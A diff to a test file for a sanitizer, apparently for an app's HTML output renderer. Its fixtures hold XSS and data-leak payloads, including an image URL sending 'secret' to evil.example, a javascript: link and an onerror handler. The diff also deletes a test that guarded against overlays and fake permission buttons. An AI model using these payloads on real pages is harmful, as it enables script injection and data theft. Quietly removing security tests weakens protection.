@@ -44,7 +44,7 @@ describe('html output', () => {
       '<img id="leak" src="https://evil.example/leak.png?d=secret">',
       '<img id="srcset" src="data:image/png;base64,iVBORw0KGgo=" srcset="https://evil.example/2x.png 2x">',
       '<div id="bg" style="background: url(https://evil.example/bg.png)">bg</div>',
-      '<div id="kept-style" style="color: red">kept</div>',
+      '<div id="kept-style" style="color: red" data-request="x">kept</div>',
       '<a id="js" href="javascript:window.__pwned = 2">j</a>',
       '<a id="ext" href="https://example.org/">ext</a>',
       '<svg><foreignObject><img src="x" onerror="window.__pwned = 3"></foreignObject></svg>',
@@ -62,31 +62,11 @@ describe('html output', () => {
     expect(byId('srcset')?.hasAttribute('srcset')).toBe(false)
     expect(byId('bg')?.getAttribute('style')).toBeNull()
     expect(byId('kept-style')?.getAttribute('style')).toBe('color: red')
+    expect(byId('kept-style')?.hasAttribute('data-request')).toBe(false)
     expect(byId('local')?.getAttribute('src')).toMatch(/^data:image\/png/)
     const ext = byId('ext')
     expect([ext?.getAttribute('target'), ext?.getAttribute('rel')]).toEqual(['_blank', 'noreferrer noopener'])
     expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
-  })
-
-  test('inlined html keeps its own look but cannot draw over the app or dress up as its parts', async () => {
-    const markup = [
-      '<div id="over" class="chat-perm dataframe" data-request="x" style="position: fixed; inset: 0; z-index: 9999; transform: translateY(-100px); color: red; padding: 4px">covers the card</div>',
-      '<table class="dataframe"><tbody><tr><td style="text-align: right; font-weight: 600; background-color: #eee; border-bottom: 1px solid #ccc">1</td></tr></tbody></table>',
-      '<span class="btn chat-perm-allow" style="position: absolute; top: 0">Allow</span>',
-    ].join('')
-    const el = await mount(<Output bundle={{ 'text/html': markup }} />)
-    const over = el.querySelector('#user-content-over') as HTMLElement
-    expect([over.style.position, over.style.zIndex, over.style.transform, over.style.inset, over.style.top]).toEqual(['', '', '', '', ''])
-    expect([over.style.color, over.style.padding]).toEqual(['red', '4px'])
-    expect(over.getAttribute('class')).toBe('dataframe')
-    expect(over.hasAttribute('data-request')).toBe(false)
-    const td = el.querySelector('td') as HTMLElement
-    expect([td.style.textAlign, td.style.fontWeight, td.style.backgroundColor]).toEqual(['right', '600', 'rgb(238, 238, 238)'])
-    expect(td.style.borderBottom).toMatch(/1px solid/)
-    const fake = el.querySelector('span')!
-    expect([fake.hasAttribute('class'), fake.hasAttribute('style')]).toEqual([false, false])
-    expect(el.querySelector('.chat-perm, .chat-perm-allow, .btn, [data-request]')).toBeNull()
-    expect(readFileSync(path.join(SRC, 'styles/outputs.css'), 'utf8')).toMatch(/\.outputs-html \{[^}]*contain: paint/)
   })
 })
 
